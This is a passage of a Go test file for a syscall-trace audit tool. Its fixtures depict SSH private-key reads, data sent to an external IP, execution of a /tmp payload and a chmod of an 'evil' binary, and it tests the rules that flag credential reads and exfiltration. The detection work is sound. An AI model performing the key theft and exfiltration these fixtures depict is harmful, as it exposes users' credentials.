		`openat(AT_FDCWD, "/home/node/.ssh/id_rsa", O_RDONLY) = 4`
	findings := parse(t, input)
	if f := findByReason(findings, "CREDENTIAL_READ_WITH_OUTBOUND"); f != nil {
		t.Fatalf("did not expect correlation when connect precedes credential read, got %+v", f)
	}
	if findByReason(findings, "EXTERNAL_NETWORK") == nil {
		t.Fatal("expected EXTERNAL_NETWORK to remain visible")
	}
}

func TestCredentialOutboundCorrelationIsPerPhase(t *testing.T) {
	// Credential in install phase must not correlate with probe-phase network.
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`openat(AT_FDCWD, "/home/node/.ssh/id_rsa", O_RDONLY) = 3` + "\n" +
		"GOAUDIT_RUNTIME_META:phase=probe\n" +
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0`
	findings := parse(t, input)
	if f := findByReason(findings, "CREDENTIAL_READ_WITH_OUTBOUND"); f != nil {
		t.Fatalf("did not expect cross-phase credential/outbound correlation, got %+v", f)
	}
}

func TestExfilDoesNotSuppressUnrelatedOutbound(t *testing.T) {
	// Proven exfil to one destination must not hide a second unrelated connect.
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`openat(AT_FDCWD, "/home/node/.ssh/id_rsa", O_RDONLY) = 3` + "\n" +
		`connect(4, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0` + "\n" +
		`sendto(4, "secret", 6, 0, NULL, 0) = 6` + "\n" +
		`connect(5, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = 0`
	findings := parse(t, input)
	if findByReason(findings, "DATA_EXFIL") == nil {
		t.Fatal("expected DATA_EXFIL for proven send")
	}
	// Second destination has no proven send — correlative warning + network finding.
	if findByReason(findings, "CREDENTIAL_READ_WITH_OUTBOUND") == nil {
		t.Fatal("expected CREDENTIAL_READ_WITH_OUTBOUND for second destination")
	}
	var externalCount int
	for _, f := range findings {
		if f.ReasonCode == "EXTERNAL_NETWORK" {
			externalCount++
		}
	}
	if externalCount < 1 {
		t.Fatal("expected at least one EXTERNAL_NETWORK for the unrelated outbound destination")
	}
}

func TestProbeLimitationMarker(t *testing.T) {
	f := findByReason(parse(t, "GOAUDIT_PROBE_LIMITATION:import_and_bin_help_only\n"), "PROBE_LIMITATION")
	if f == nil {
		t.Fatal("expected PROBE_LIMITATION finding")
	}
}

func TestDetectsIPv6ExternalNetwork(t *testing.T) {
	f := findByReason(parse(t,
		`connect(3, {sa_family=AF_INET6, sin6_port=htons(443), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "2606:4700::6810:1723"), sin6_scope_id=0}, 28) = 0`),
		"EXTERNAL_NETWORK")
	if f == nil {
		t.Fatal("expected EXTERNAL_NETWORK for IPv6 connection with sin6_port")
	}
}

func TestFailedOpenatNotFlagged(t *testing.T) {
	findings := parse(t,
		`openat(AT_FDCWD, "/root/.ssh/id_ed25519", O_RDONLY) = -1 ENOENT (No such file or directory)`)
	for _, f := range findings {
		if f.ReasonCode == "CREDENTIAL_READ" {
			t.Fatal("should not flag failed openat (ENOENT) as CREDENTIAL_READ")
		}
	}
}

func TestFailedExecveNotFlagged(t *testing.T) {
	findings := parse(t,
		`execve("/tmp/payload", ["/tmp/payload"]) = -1 ENOENT (No such file or directory)`)
	for _, f := range findings {
		if f.ReasonCode == "SUSPICIOUS_EXEC" {
			t.Fatal("should not flag failed execve (ENOENT) as SUSPICIOUS_EXEC")
		}
	}
}

func TestFailedChmodNotFlagged(t *testing.T) {
	findings := parse(t,
		`chmod("/usr/local/bin/evil", 0755) = -1 ENOENT (No such file or directory)`)
	for _, f := range findings {
		if f.ReasonCode == "PERSISTENCE_WRITE" {
			t.Fatal("should not flag failed chmod (ENOENT) as PERSISTENCE_WRITE")
		}
	}
}

func TestSuccessfulOpenatStillFlagged(t *testing.T) {
	// Ensure the failed-syscall filter doesn't suppress successful reads.
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/root/.ssh/id_ed25519", O_RDONLY) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for successful openat of .ssh/id_ed25519")
	}
}
